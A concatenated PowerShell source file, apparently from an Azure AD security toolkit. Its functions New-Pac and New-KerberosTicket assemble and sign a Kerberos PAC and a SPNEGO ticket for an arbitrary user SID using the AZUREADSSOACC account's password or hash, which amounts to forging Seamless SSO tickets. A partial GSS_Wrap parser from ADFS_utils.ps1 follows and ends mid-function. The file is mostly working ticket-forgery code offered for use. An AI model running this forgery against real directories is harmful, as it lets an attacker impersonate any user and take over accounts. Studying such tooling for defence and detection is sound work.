        $size = $LOGON_INFORMATION.Count - 16 # 
        [Array]::Copy([bitconverter]::GetBytes([Int32]$size),0, $LOGON_INFORMATION, 8, 4)

        $CLIENT_NAME_TICKET_INFO=@(
            [System.BitConverter]::GetBytes($DeviceId.ToFileTime())     # ClientId - MUST be equal to authTime
            [System.BitConverter]::GetBytes([int16]($bUserName.Length)) # Name Length
            $bUserName
        )
        $UPN_DOMAIN_INFO=@(
            [System.BitConverter]::GetBytes([int16]($bUserPrincipalName.Length))      # UpnLength
            [System.BitConverter]::GetBytes([int16]0x10)                              # UpnOffset 
            [System.BitConverter]::GetBytes([int16]($bDomainDNSName.Length))          # DnsDomainNameLength
            [System.BitConverter]::GetBytes([int16]($bUserPrincipalName.Length+0x10)) # DnsDomainNameOffset 
    
            @(0x00, 0x00, 0x00, 0x00) # Flags
            @(0x00, 0x00, 0x00, 0x00) # Some align thing?
            $bUserPrincipalName       # UPN
            $bDomainDNSName           # DNS Domain
        )
        $SERVER_CHECKSUM=@(
            @(0x76, 0xFF, 0xFF, 0xFF) # Type = KERB_CHECKSUM_HMAC_MD5
            @(0x00, 0x00, 0x00, 0x00, # Server checksum - MUST be 0x00 to calculate checksum
              0x00, 0x00, 0x00, 0x00, 
              0x00, 0x00, 0x00, 0x00, 
              0x00, 0x00, 0x00, 0x00)
        )
        $PRIVILEGE_SERVER_CHECKSUM=@(
            @(0x10, 0x00, 0x00, 0x00) # Type = HMAC_SHA1_96_AES256
            @(0x00, 0x00, 0x00, 0x00, # KDC checksum - MUST be 0x00 to calculate (server) checksum
              0x00, 0x00, 0x00, 0x00, # Otherwise this is not needed nor used
              0x00, 0x00, 0x00, 0x00)
        )


        # Construct the header
        $Offset = 88

        $HEADER = @()

        # Align the blocks
        $logon_info_size =      Align-Size -Size $LOGON_INFORMATION.Length         -Mask 8
        $client_info_size =     Align-Size -Size $CLIENT_NAME_TICKET_INFO.Length   -Mask 8
        $upn_info_size =        Align-Size -Size $UPN_DOMAIN_INFO.Length           -Mask 8
        $server_check_size =    Align-Size -Size $SERVER_CHECKSUM.Length           -Mask 8 
        $privilege_check_size = Align-Size -Size $PRIVILEGE_SERVER_CHECKSUM.Length -Mask 8

        $HEADER += @(0x05, 0x00, 0x00, 0x00) # Pac count = 5
        $HEADER += @(0x00, 0x00, 0x00, 0x00) # Version = 0

        $HEADER += @(0x01, 0x00, 0x00, 0x00)                                 # LOGON INFO
        $HEADER += [System.BitConverter]::GetBytes([int32]$logon_info_size)  # Size 
        $HEADER += [System.BitConverter]::GetBytes([int64]$Offset)           # Offset
        $Offset+=$logon_info_size

        $HEADER += @(0x0A,  0x00,  0x00,  0x00)                              # CLIENT_NAME_TICKET_INFO
        $HEADER += [System.BitConverter]::GetBytes([int32]$client_info_size) # Size
        $HEADER += [System.BitConverter]::GetBytes([int64]$Offset)           # Offset
        $Offset+=$client_info_size

        $HEADER += @(0x0C,  0x00,  0x00,  0x00)                              # UPN_DOMAIN_INFO
        $HEADER += [System.BitConverter]::GetBytes([int32]$upn_info_size)    # Size
        $HEADER += [System.BitConverter]::GetBytes([int64]$Offset)           # Offset
        $Offset+=$upn_info_size
    
        $HEADER += @(0x06,  0x00,  0x00,  0x00)                                 # SERVER_CHECKSUM
        $HEADER += [System.BitConverter]::GetBytes([int32]$server_check_size-4) # Size 
        $HEADER += [System.BitConverter]::GetBytes([int64]$Offset)              # Offset 
        $Offset+=$server_check_size
    
        $HEADER += @(0x07,  0x00,  0x00,  0x00)                                  # PRIVILEGE_SERVER_CHECKSUM
        $HEADER += [System.BitConverter]::GetBytes([int32]$privilege_check_size) # Size 
        $HEADER += [System.BitConverter]::GetBytes([int64]$Offset)               # Offset
        

        # Construct the PAC
        $PAC=@()

        $PAC += $HEADER
        $PAC += $LOGON_INFORMATION
        $PAC += Get-AlignBytes -Size $LOGON_INFORMATION.Length -Mask 8
        $PAC += $CLIENT_NAME_TICKET_INFO
        $PAC += Get-AlignBytes -Size $CLIENT_NAME_TICKET_INFO.Length -Mask 8
        $PAC += $UPN_DOMAIN_INFO 
        $PAC += Get-AlignBytes -Size $UPN_DOMAIN_INFO.Length -Mask 8
        $PAC +=  $SERVER_CHECKSUM          # KERB_CHECKSUM_HMAC_MD5
        $PAC += Get-AlignBytes -Size $SERVER_CHECKSUM.Length -Mask 8
        $PAC += $PRIVILEGE_SERVER_CHECKSUM #HMAC_SHA1_96_AES256
        $PAC += Get-AlignBytes -Size $PRIVILEGE_SERVER_CHECKSUM.Length -Mask 8
        
        # Convert the password to MD4 hash
        if([string]::IsNullOrEmpty($Hash))
        {
            $checksum_key = Get-MD4 -String $Password -AsByteArray
        }
        else
        {
            $checksum_key = Convert-HexToByteArray -HexString $Hash
        }
        # Checksums
        $serverChecksum = Get-ServerSignature -Key $checksum_key -Data $PAC
        $KDCChecksum =    Get-RandomBytes -Bytes 12 # Not checked by the server, so random checksum will do

        # Create the signature block - Only server block gets validated in the server
        $signatureBlock = @(
            @(0x76, 0xFF, 0xFF, 0xFF) # Type = KERB_CHECKSUM_HMAC_MD5
            $serverChecksum
            (Get-AlignBytes -Size $SERVER_CHECKSUM.Length -Mask 8)
            @(0x10, 0x00, 0x00, 0x00)       # Type = HMAC_SHA1_96_AES256
            $KDCChecksum
            (Get-AlignBytes -Size $PRIVILEGE_SERVER_CHECKSUM.Length -Mask 8)
        )

        # Add signature block to the end of the PAC
        $PAC=$PAC[0..($PAC.Length - $signatureBlock.Length-1)] + $signatureBlock

        # Return
        return [byte[]]$PAC
    }
}

# Aug 26th 2019
# Generates a kerberos token to be used with Azure AD Desktop SSO (aka Seamless SSO)
Function New-KerberosTicket
{
    <#
    .SYNOPSIS
    Generates a kerberos token to be used with Azure AD Desktop SSO

    .DESCRIPTION
    Generates a kerberos token to be used with Azure AD Desktop SSO, also known as Seamless SSO.
    Azure AD does only care about user's sid, so no other information needs to be given.

    .Parameter Sid
    User's sid as a byte array

    .Parameter ADUserPrincipalName
    User's principal name. Used to find user from Active Directory to get the SID

    .Parameter AADUserPrincipalName
    User's principal name. Used to find user from Azure Active Directory to get the SID

    .Parameter AccessToken
    Access Token of the user accessing Azure Active Directory to find the given user to get the SID

    .Parameter Password
    Password of the AZUREADSSOACC computer account

    .Parameter Hash
    MD4 hash of the AZUREADSSOACC computer account

    .Example
    PS C:\>Get-IntKerberosTicket -Password "MyPassword" -Sid $sid

    YIIHIAYGKwYBBQUCoIIHFDCCBxC..(truncated)..qJ9OYopBjdCAzi8gY8dIFy8+g==

    .Example
    PS C:\>Get-IntKerberosTicket -Hash @(0,4,234) -Sid $sid

    YIIHIAYGKwYBBQUCoIIHFDCCBxC..(truncated)..qJ9OYopBjdCAzi8gY8dIFy8+g==

    .Example
    PS C:\>Get-IntKerberosTicket -Password "MyPassword" -SidString "S-1-5-21-854568531-3289094026-2628502219-1111"

    YIIHIAYGKwYBBQUCoIIHFDCCBxC..(truncated)..qJ9OYopBjdCAzi8gY8dIFy8+g==

    .Example
    PS C:\>Get-IntKerberosTicket -Password "MyPassword" -ADUserPricipalName "user@company.com"
    WARNING: SID not given, trying to find user from the Active Directory

    YIIHIAYGKwYBBQUCoIIHFDCCBxC..(truncated)..qJ9OYopBjdCAzi8gY8dIFy8+g==

    PS C:\>Get-IntKerberosTicket -Password "MyPassword" -ADUserPricipalName "user@company.com"
    WARNING: SID not given, trying to find user from the Azure Active Directory.
    WARNING: This may take some time, so it would be better to save the AAD objects to
    WARNING: a variable using Get-IntSyncObjects and parse SID manually.

    YIIHIAYGKwYBBQUCoIIHFDCCBxC..(truncated)..qJ9OYopBjdCAzi8gY8dIFy8+g==
    
#>
    [cmdletbinding()]
    Param(
        [Parameter(ParameterSetName='Sid',Mandatory=$True)]
        [Byte[]]$Sid,
        [Parameter(ParameterSetName='SidString',Mandatory=$True)]
        [String]$SidString,
        [Parameter(ParameterSetName='ADupn',Mandatory=$True)]
        [String]$ADUserPrincipalName,
        [Parameter(ParameterSetName='AADupn',Mandatory=$True)]
        [String]$AADUserPrincipalName,
        [Parameter(ParameterSetName='AADupn',Mandatory=$True)]
        [String]$AccessToken,
        [Parameter(Mandatory=$False)]
        [String]$Password,
        [Parameter(Mandatory=$False)]
        [String]$Hash,
        [Parameter(Mandatory=$False)]
        [byte[]]$SessionKey=(New-Guid).ToByteArray(),


        [Parameter(Mandatory=$False)]
        [String]$UserName=          "UserName",
        [Parameter(Mandatory=$False)]
        [String]$UserDisplayName=   "DisplayName",
        [Parameter(Mandatory=$False)]
        [String]$UserPrincipalName= "UserName@company.com",
        [Parameter(Mandatory=$False)]
        [String]$ServerName=        "DC1.company.com",
        [Parameter(Mandatory=$False)]
        [String]$DomainName=        "COMPANY",
        [Parameter(Mandatory=$False)]
        [String]$Realm=             "COMPANY.COM",
        [Parameter(Mandatory=$False)]
        [String]$ServiceTarget = "HTTP/autologon.microsoftazuread-sso.com",

        [Parameter(Mandatory=$False)]
        [ValidateSet('RC4','AES')]
        [String]$Crypto="RC4",

        [Parameter(Mandatory=$False)]
        [String]$Salt,

        [Parameter(Mandatory=$False)]
        [Int]$SequenceNumber=([System.Random]::new()).Next()

    )
    Process
    {
        # Hash or password must be given!
        if([string]::IsNullOrEmpty($Password) -and $Hash -eq $null)
        {
            Throw "Password or hash must be given!"
        }

        if(![string]::IsNullOrEmpty($Salt))
        {
            $AESSalt = [text.encoding]::UTF8.getBytes($Salt)
        }

        if($Crypto -eq "AES" -and $AESSalt -eq $null)
        {
            Throw "Salt needed for AES encrypted Kerberos ticket!"
        }

        # Got ADUserPrincipalName so we need to try to find SID from AD
        if(![String]::IsNullOrEmpty($ADUserPrincipalName))
        {
            Write-Verbose "SID not given, trying to find user from the Active Directory"
            try
            {
                $User=Get-Sids -UserPrincipalName $ADUserPrincipalName
                if($user -eq $null)
                {
                    return
                }
                $sidObject = [System.Security.Principal.SecurityIdentifier]$user.Sid
                $Sid = New-Object Byte[] $sidObject.BinaryLength
                $sidObject.GetBinaryForm($Sid,0)
                Write-Verbose "$([byte[]]$Sid | Format-Hex)"
            }
            catch
            {
                Write-Error "Couldn't find the user: $($_.Exception)"
                return
            }
        }
        # Got AADUserPrincipalName so we need to try to find SID from Azure AD
        elseif(![String]::IsNullOrEmpty($AADUserPrincipalName))
        {
            Write-Verbose "SID not given, trying to find user from the Azure Active Directory."
            try
            {
                $User=Get-Sids -AccessToken $AccessToken -UserPrincipalName $AADUserPrincipalName
                if($user -eq $null)
                {
                    return
                }
                $sidObject = [System.Security.Principal.SecurityIdentifier]$user.Sid
                $Sid = New-Object Byte[] $sidObject.BinaryLength
                $sidObject.GetBinaryForm($Sid,0)
                Write-Verbose "$([byte[]]$Sid | Format-Hex)"

            }
            catch
            {
                Write-Error "Couldn't find the user: $($_.Exception)"
                return
            }
        }
        # Got SidString so try to convert it
        elseif(![String]::IsNullOrEmpty($SidString))
        {
            try
            {
                Write-Verbose "Got SidString: $SidString"
                $sidObject = [System.Security.Principal.SecurityIdentifier]$SidString
                $Sid = New-Object Byte[] $sidObject.BinaryLength
                $sidObject.GetBinaryForm($Sid,0)
                Write-Verbose (Convert-ByteArrayToHex -Bytes $Sid)
            }
            catch
            {
                Write-Error "Couldn't convert `"$SidString`" to SID: $($_.Exception)"
                return
            }
        }

        # KRB_AP_REQ
        # Set the times
        
        $authTime = Get-Date -Millisecond 0
        $authTime.AddSeconds(-43) | Out-Null # Authentication time should be (a little) in the past
        $startTime = $authTime #.AddSeconds(7)
        $endTime = $authTime.AddHours(10)
        $renewTime = $authTime.AddDays(7)
        $cTime = Get-Date
        

        $machineId =  Get-RandomBytes -Bytes 32
        $kerbLocal1 = Get-RandomBytes -Bytes 16
        $kerbLocal2 = Get-RandomBytes -Bytes 16

        # The ticket
        $ticket=Add-DERTag -Tag 0x63 -Data @(
            Add-DERSequence -Data @(
            Add-DERTag -Tag 0xA0 -Data @(Add-DERTag -Tag 0x03 -Data @(0x00, 0x40, 0xA1, 0x00, 0x00)) #Flags 100 0000 1010 0001 old
            # Encryption key                                                                                100 0000 0010 0001 new
            Add-DERTag -Tag 0xA1 -Data @(
                Add-DERSequence -Data @(
                    if($Crypto -eq "RC4")
                    {
                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x17)) # rc4-hmac
                    }
                    elseif($Crypto -eq "AES")
                    {
                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x12)) # aes256-cts-hmac-sha1-96
                    }
                    Add-DERTag -Tag 0xA1 -Data @(
                        Add-DERTag -Tag 0x04 -Data $SessionKey # Session key
                    )
                )
            )
            # Realm
            Add-DERTag -Tag 0xA2 -Data @(Add-DERUtf8String($Realm))
            Add-DERTag -Tag 0xA3 -Data @( # CName
                Add-DERSequence -Data @(
                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x01)) # NT_PRINCIPAL
                    Add-DERTag -Tag 0xA1 -Data @(
                        Add-DERSequence -Data @(Add-DERUtf8String($UserName))
                    )
                )
            )
            Add-DERTag -Tag 0xA4 -Data @(
                Add-DERSequence -Data @(
                    Add-DERTag -Tag 0xA0 -data @(Add-DERInteger -Data @(0x01))
                    Add-DERTag -Tag 0xA1 -Data @(0x04,0x00) # Empty octect string: CAddr
                )
            )
            
            Add-DERTag -Tag 0xA5 -Data @(Add-DERDate -Date $authTime) # Generalized time: AuthTime
            Add-DERTag -Tag 0xA6 -Data @(Add-DERDate -Date $startTime) # Generalized time: StartTime
            Add-DERTag -Tag 0xA7 -Data @(Add-DERDate -Date $endTime) # Generalized time: EndTime
            Add-DERTag -Tag 0xA8 -Data @(Add-DERDate -Date $renewTime) # Generalized time: RenewTill
            Add-DERTag -Tag 0xAA -Data @(
                Add-DERSequence -Data @(
                    Add-DERSequence -Data @(

                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x01)) # ADIfRelevant
                    Add-DERTag -Tag 0xA1 -Data @(
                        Add-DERTag -Tag 0x04 -Data @(
                            Add-DERSequence -Data @(
                                Add-DERSequence -Data @(
                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x80)) # PAC type = AdWin2kPac
                                    Add-DERTag -Tag 0xA1 -Data @(
                                    
                                        Add-DERTag -Tag 0x04 -Data @(
                                            # Generate PAC
                                            [byte[]](New-Pac -UserName $UserName -UserDisplayName $UserDisplayName -UserPrincipalName $UserPrincipalName -ServerName $ServerName -DomainName $DomainName -DomainDNSName $Realm -Sid $Sid -Password $Password -Hash $Hash -AuthTime $authTime -SequenceNumber $SequenceNumber)) 
                                    )
                                )
                            )
                            
                        )
                    )
                )
                    Add-DERSequence -Data @(
                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x01)) 
                    Add-DERTag -Tag 0xA1 -Data @(
                        Add-DERTag -Tag 0x04 -Data @(

                            Add-DERSequence -Data @(
                                Add-DERSequence -Data @( 
                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x8D)) # KERB_AUTH_DATA_TOKEN_RESTRICTIONS
                                    Add-DERTag -Tag 0xA1 -Data @( 
                                        Add-DERTag -Tag 0x04 -Data @( # Octet string
                                            Add-DERSequence -Data @(
                                                Add-DERSequence -Data @(
                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00)) # Restrictiontype, must be 0x00
                                                    Add-DERTag -Tag 0xA1 -Data @(
                                                        Add-DERTag -Tag 0x04 -Data @(
                                                            # Flags
                                                            @(0x00, 0x00, 0x00, 0x00)  # Full token
                                                            #@(0x01, 0x00, 0x00, 0x00) # UAC restricted token
                                                            # Integritylevel
                                                            # @(0x00, 0x00, 0x00, 0x00) # Untrusted
                                                            @(0x00, 0x10, 0x00, 0x00)   # Low
                                                            # @(0x00, 0x20, 0x00, 0x00) # Medium
                                                            # @(0x00, 0x30, 0x00, 0x00) # High
                                                            # @(0x00, 0x40, 0x00, 0x00) # System
                                                            # @(0x00, 0x50, 0x00, 0x00) # Protected processes
                                                            # Machine Id
                                                            $machineId
                                                        )
                                                    )
                                                )
                                            )
                                        )
                                    )

                                )
                            
                                Add-DERSequence -Data @(
                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x8E))
                                    # KerbLocal
                                    Add-DERTag -Tag 0xA1 -Data @(Add-DERTag -Tag 0x04 -Data $kerbLocal1)
                                )
                                
                            )
                            
                        )
                    )
                )
                )
            )
        )
        )
        $encryptionKey = New-KerberosKey -Password $Password -Hash $Hash -Crypto $Crypto
        $encryptedTicket = Encrypt-Kerberos -Data $ticket -Type Ticket -Salt $AESSalt -Crypto $Crypto -Key $encryptionKey
    
        $authenticator=Add-DERTag -Tag 0x62 -Data @(
            Add-DERSequence -Data @(
                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x05))
                Add-DERTag -Tag 0xA1 -Data @(Add-DERUtf8String -Text $Realm -Tag 0x1B)
                Add-DERTag -Tag 0xA2 -Data @(
                    Add-DERSequence -Data @(
                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x01))
                        Add-DERTag -Tag 0xa1 -Data @(
                            Add-DERSequence -Data @(
                                Add-DERUtf8String -Text $UserName -Tag 0x1B
                            )
                        )
                    )
                )
                Add-DERTag -Tag 0xA3 -Data @(
                    # Authenticator checksum
                    # https://tools.ietf.org/html/rfc4121#page-6
                    Add-DERSequence -Data @(
                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x80, 0x03)) # Checksum type 32771 = KRBv5
                        # Checksum https://tools.ietf.org/html/rfc4121#section-4.1.1
                        Add-DERTag -Tag 0xA1 -Data @(
                            Add-DERTag -Tag 0x04 -Data @(
                                # Length = 0x10 = 16
                                @(0x10, 0x00, 0x00, 0x00)
                                # Binding information
                                @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
                                
                                # Flags
                                # https://tools.ietf.org/html/rfc2744
                                # GSS_C_DELEG_FLAG            0x01       1
                                # GSS_C_MUTUAL_FLAG           0x02       2
                                # GSS_C_REPLAY_FLAG           0x04       4
                                # GSS_C_SEQUENCE_FLAG         0x08       8
                                # GSS_C_CONF_FLAG             0x10      16
                                # GSS_C_INTEG_FLAG            0x20      32
                                # GSS_C_ANON_FLAG             0x40      64
                                # GSS_C_PROT_READY_FLAG       0x80     128

                                # GSS_C_TRANS_FLAG           0x100     256

                                # GSS_C_DCE_STYLE           0x1000    4096
                                # GSS_C_IDENTIFY_FLAG       0x2000    8192
                                # GSS_C_EXTENDED_ERROR_FLAG 0x4000   16384
                                # GSS_C_DELEG_POLICY_FLAG   0x8000   32768

                                @(0x3E, 0x20, 0x00, 0x00)

                                
                            )
                        )
                    )
                )
                Add-DERTag -Tag 0xA4 -Data @(Add-DERInteger -Data (0x01)) # Cusec = milliseconds part of authTime -- for replay detection, so can be anything
                Add-DERTag -Tag 0xA5 -Data @(Add-DERDate    -Date $cTime) # CTime

                
                Add-DERTag -Tag 0xA6 -Data @(
                    Add-DERSequence -Data @(
                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x17)) # Subkey - not used here to anything
                        Add-DERTag -Tag 0xA1 -Data @(Add-DERTag -Tag 0x04 -Data (New-Guid).ToByteArray())
                    )
                )
                Add-DERTag -Tag 0xA7 -Data @(Add-DERInteger -Data @([System.BitConverter]::GetBytes($SequenceNumber)) ) # Sequence number
                
                Add-DERTag -Tag 0xA8 -Data @(
                        Add-DERSequence -Data @(
                            Add-DERSequence -Data @(
                                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x01))
                                Add-DERTag -Tag 0xA1 -Data @(
                                    Add-DERTag -Tag 0x04 -Data @(
                                        Add-DERSequence -Data @(
                                                Add-DERSequence -Data @(
                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x81))

                                                    # AdETypeNegotiation
                                                    Add-DERTag -Tag 0xA1 -Data @(Add-DERTag -Tag 0x04 -Data @(
                                                        Add-DERSequence -Data @(
                                                                #Add-DERInteger -Data @(0x12) # AES256_CTS_HMAC_SHA1_96
                                                                #Add-DERInteger -Data @(0x11) # AES128_CTS_HMAC_SHA1_96
                                                                Add-DERInteger -Data @(0x17) # RC4_HMAC_NT
                                                            )
                                                        )
                                                    )
                                                )
                                                Add-DERSequence -Data @(
                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x8D))
                                                    Add-DERTag -Tag 0xA1 -Data @(
                                                        Add-DERTag -Tag 0x04 -Data @(
                                                            
                                                            Add-DERSequence -Data @(
                                                                Add-DERSequence -Data @(
                                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00)) #Restrictiontype = 0
                                                                    # Restrictions
                                                                        Add-DERTag -Tag 0xA1 -Data @(Add-DERTag -Tag 0x04 -Data @(
                                                                            # Flags = Full
                                                                            @(0x00, 0x00, 0x00, 0x00)
                                                                            # Integritylevel = Low
                                                                            @(0x00, 0x10, 0x00, 0x00)
                                                                            # Machine Id
                                                                            $machineId
                                                                        )
                                                                    )
                                                                )
                                                            
                                                            )
                                                       )
                                                  )
                                             )
           
                                                Add-DERSequence -Data @(
                                                    # KerbLocal
                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x8E))
                                                    Add-DERTag -Tag 0xA1 -Data @(Add-DERTag -Tag 0x04 -Data $kerbLocal2)
                                                    )
                                                Add-DERSequence -Data @(
                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x8F))
                                            
                                                    Add-DERTag -Tag 0xA1 -Data @(
                                                        Add-DERTag -Tag 0x04 -Data @(
                                                            # KerbApOptions = ChannelBindingSupported
                                                            @(0x00, 0x40, 0x00, 0x00)
                                                        )
                                                    )
                                                ) 
                                                    Add-DERSequence -Data @(
                                                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x90))
                                            
                                                        Add-DERTag -Tag 0xA1 -Data @(
                                                            # KerbServiceTarget
                                                            Add-DERUnicodeString -Text "$ServiceTarget@$Realm"
                                                        )
                                                    )
                                           )
                                      )
                                 )
                            )
                       )
                  )
             )
        )
        $encryptedAuthenticator = Encrypt-Kerberos -Data $authenticator -Key $SessionKey -Type Authenticator -Salt $AESSalt -Crypto $Crypto

        # NegTokenInit
        $kerberosTicket=Add-DERTag -Tag 0x60 -Data @(
            Add-DERObjectIdentifier -ObjectIdentifier "1.3.6.1.5.5.2" # SPNEGO
            Add-DERTag -Tag 0xA0 -Data @(
    
                Add-DERSequence -Data @(
                    # MechTypeList
                    Add-DERTag -Tag 0xA0 -Data @( # MechTypeList
                        Add-DERSequence -Data @(
                            Add-DERObjectIdentifier -ObjectIdentifier "1.2.840.48018.1.2.2"    # Microsoft Kerberos OID
                            Add-DERObjectIdentifier -ObjectIdentifier "1.2.840.113554.1.2.2"   # Kerberos V5 OID
                            Add-DERObjectIdentifier -ObjectIdentifier "1.3.6.1.4.1.311.2.2.30" # Negoex
                            Add-DERObjectIdentifier -ObjectIdentifier "1.3.6.1.4.1.311.2.2.10" # NTLM
                        )
                    )
                    Add-DERTag -Tag 0xA2 -Data @( # MechToken
            

                        Add-DERTag -Tag 0x04 -Data @(
                            Add-DERTag -Tag 0x60 -Data @(# Application constructed object
                        
                                    Add-DERObjectIdentifier -ObjectIdentifier "1.2.840.113554.1.2.2"   # Kerberos V5 OID
                                    Add-DERBoolean -Value $False
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        Add-DERTag -Tag 0x6E -Data @(
                            Add-DERSequence -Data @(
                                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x05)) 
                                Add-DERTag -Tag 0xA1 -Data @(Add-DERInteger -Data @(0x0e)) 
                                Add-DERTag -Tag 0xA2 -Data @(Add-DERTag -Tag 0x03 -Data @(0x00, 0x20, 0x00, 0x00, 0x00)) # KERB_VALINFO
                                Add-DERTag -Tag 0xA3 -Data @(
                            # AUTHENTICATOR
                                    Add-DERTag -Tag 0x61 -Data @(
                                        Add-DERSequence -Data @(
                                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x05)) # AuthenticatorVersionNumber = 5
                                        Add-DERTag -Tag 0xA1 -Data @(Add-DERUtf8String -Text $Realm)
                                        Add-DERTag -Tag 0xA2 -Data @(
                                            Add-DERSequence -Data @(
                                                Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x02))
                                                Add-DERTag -Tag 0xA1 -Data @(
                                                    Add-DERSequence -Data @(
                                                        Add-DERUtf8String -Text $ServiceTarget.Split("/")[0]
                                                        Add-DERUtf8String -Text $ServiceTarget.Split("/")[1]
                                                    )
                                                )
                                            )
                                        )
                                        Add-DERTag -Tag 0xA3 -Data @(
                                            Add-DERSequence -Data @(
                                                if($Crypto -eq "RC4")
                                                {
                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x17)) # rc4-hmac
                                                }
                                                elseif($Crypto -eq "AES")
                                                {
                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x12)) # aes256-cts-hmac-sha1-96
                                                }
                                                Add-DERTag -Tag 0xA1 -Data @(Add-DERInteger -Data @(0x05)) 
                                                Add-DERTag -Tag 0xA2 -Data @(Add-DERTag -Tag 0x04 $encryptedTicket)
                                               
                                            )
                                        )
                                
                                    )
                                 )
                    
                    
                    
                            )

                            Add-DERTag -Tag 0xA4 -Data @(
                                            Add-DERSequence -Data @(
                                                if($Crypto -eq "RC4")
                                                {
                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x17)) # rc4-hmac
                                                }
                                                elseif($Crypto -eq "AES")
                                                {
                                                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x12)) # aes256-cts-hmac-sha1-96
                                                }
                                                Add-DERTag -Tag 0xA2 -Data @(Add-DERTag -Tag 0x04 $encryptedAuthenticator)

                                                
                                            )
                                        )
                                    )
                                )
                         
                            )
                        )
                    )
                )
            )
        )
        
        # Return
        $b64Ticket=[Convert]::ToBase64String([byte[]]$kerberosTicket)
        return $b64Ticket
    }
}


#============================================================
# Source: ADFS_utils.ps1
#============================================================

# Parses GSS_Wrap and returns the encrypted data part
# Apr 1st 2021
function Parse-GSS_Wrap
{
    Param(
        [Parameter(Mandatory=$True)]
        [Byte[]]$Data,
        [Parameter(Mandatory=$True)]
        [Byte[]]$SessionKey,
        [Parameter(Mandatory=$False)]
        [ValidateSet('Initiator','Acceptor')]
        [String]$Direction = 'Initiator',
        [Parameter(Mandatory=$True)]
        [Int]$SequenceNumber,
        [Parameter(Mandatory=$False)]
        [Int]$Type = 23 # 23 = rc4-hmac, 18 = aes256-cts-hmac-sha1-96
    )
    Process
    {
        if($Type -eq 18 ) # aes256-cts-hmac-sha1-96
        {
            # TODO: implement support for this
            Throw "Unsupported GSS_WRAP type: $Type"

            $s = 0

            # Get the token header information
            $TOK_ID =   $Data[$s..($s+1)] ; $s+=2
            $Flags =    $Data[        $s] ; $s+=1
            $Filler =   $Data[        $s] ; $s+=1
            $EC =       $Data[$s..($s+1)] ; $s+=2
            $RRC =      $Data[$s..($s+1)] ; $s+=2
            $SND_SEQ =  $Data[$s..($s+7)] ; $s+=8

            [array]::Reverse($RRC)
            $rotations = [bitconverter]::TouInt16($RRC,0)
            

            [array]::Reverse($SND_SEQ)
            if([bitconverter]::TouInt32($SND_SEQ,0) -ne $SequenceNumber)
            {
                Write-Warning "Sequence number mismatch!"
            }

            # Extract token information
            $encData = $Data[$s..($data.Count - 1)]

            # Rotate the data
            for($r = 0; $r -lt $rotations; $r++)
            {
                $t = $encData[$encData.Count-1]
                for($i = $encData.Count-1 ; $i -gt 0; $i--)
                {
                    $encData[$i] = $encData[$i-1]
                }
                $encData[0] = $t

            }
            $encData | Format-Hex
            
            return
        }
        elseif($Type -eq 23) # rc4-hmac
        {

            # Generate the sequence number from the given integer and add "direction" bytes
            $SND_SEQ = [System.BitConverter]::GetBytes([uint32]$SequenceNumber)
            [Array]::Reverse($SND_SEQ)
            if($Direction -eq 'Initiator')
            {
                $SND_SEQ += @(0xff, 0xff, 0xff, 0xff)
            }
            else
            {
                $SND_SEQ += @(0x00, 0x00, 0x00, 0x00)
            }

            # Get object identifier
            $tokLen = $Data[1]
            $oidLen = $Data[3]
            $oid = Convert-BytesToOid -Bytes $Data[4..(4+$oidLen-1)]
            $s = 4+$oidLen

            # Save the header for checksum calculation
            $TOKEN_HEADER = $Data[$s..($s+7)]

            # Get the token header information
            $TOK_ID =   $Data[$s..($s+1)] ; $s+=2
            $SGN_ALG =  $Data[$s..($s+1)] ; $s+=2
            $SEAL_ALG = $Data[$s..($s+1)] ; $s+=2
            $Filler =   $Data[$s..($s+1)] ; $s+=2

            # Extract token information
            $encSND_SEQ =         $Data[$s..($s+7)] ; $s+=8
            $SGN_CHKSUM =         $Data[$s..($s+7)] ; $s+=8
            $encSGN_Confounder =  $Data[$s..($s+7)] ; $s+=8
            $encData =            $Data[$s..($data.Count - 1)]

            # Validation
            # Token id should be 0x0102
            if(($tid=[System.BitConverter]::ToInt16($TOK_ID,0)) -ne 0x102)
            {
                Write-Warning "Unknown TOKEN_ID ($tid), expected 256"
            }
            # Signing algorithm should be HMAC 0x0011
            if(($sgalg=[System.BitConverter]::ToInt16($SGN_ALG,0)) -ne 0x11)
            {
                Write-Warning "Unknown SGN_ALG  ($sgalg), expected HMAC (17)"
            }
            # Encryption algorithm should be RC4 0x0010
